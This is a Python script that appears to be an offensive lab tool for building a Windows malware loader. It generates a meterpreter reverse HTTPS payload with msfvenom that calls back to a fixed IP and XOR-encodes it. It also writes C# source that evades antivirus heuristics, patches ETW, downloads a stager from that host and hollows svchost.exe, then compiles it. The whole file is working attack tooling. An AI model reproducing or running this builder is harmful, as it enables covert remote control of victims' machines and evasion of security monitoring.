#!/bin/env python3
import ak
import os
import subprocess

LHOST = "192.168.49.65"
LPORT = 443
BASE_FILENAME = 'win_hollow'
MSFVENOM_CMD = f"msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_https LHOST={LHOST} LPORT={LPORT} -f raw -e generic/none"
SVCHOST_PATH = b"C:\\\\Windows\\system32\\svchost.exe"
XOR_KEY = b'\x09'
STAGER_URL = "http://192.168.49.65/sc"

def generate():
  svchost_path = ak.Obfuscator(SVCHOST_PATH, XOR_KEY)
  url_dl_code = ak.URL_DL_CODE.format(STAGER_URL=STAGER_URL)

  template = """
using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Hallo
{{
    public class Program
    {{

	{ak.HEURISTICS_IMPORT}
	{ak.ARCH_DETECTION}
	{ak.ETW_FUNCS}
        {ak.START_PROCESS_HOLLOW_IMPORT}

        static void Main(string[] args)
        {{
	    {ak.HEURISTICS_CODE}
	    {ak.ETW_PATCH}
	    {URL_DL_CODE}

            byte[] procname = new byte[] {{ {xor_svchost_path} }};

            for (int i = 0; i < procname.Length; i++)
            {{
                procname[i] = (byte)(((uint)procname[i] ^ {xor_key}) & 0xFF);
            }}

            {ak.START_PROCESS_HOLLOW_CODE}

        }}
    }}
}}
""".format(ak=ak,
           URL_DL_CODE=url_dl_code,
           xor_key=svchost_path.get_key_csharp(),
           xor_svchost_path=svchost_path.get_hex_csharp()
           )

  print(template)
  f = open(BASE_FILENAME + '.cs', "w")
  f.write(template)
  f.close()

  print("Wrote "+ BASE_FILENAME + '.cs')


def compile():
  cmd = f"mcs {BASE_FILENAME}.cs"
  os.system(cmd)
  print("Wrote "+ BASE_FILENAME + '.exe')

def main():
  shellcode = ak.ShellCode(MSFVENOM_CMD, xor_key=XOR_KEY)

  generate()
  compile() 

  f = open(BASE_FILENAME + '.sc', "wb")
  f.write(shellcode.get_bytes())
  f.close()
  print("Wrote shellcode to "+ BASE_FILENAME + '.sc')


if __name__ == "__main__":
  main()
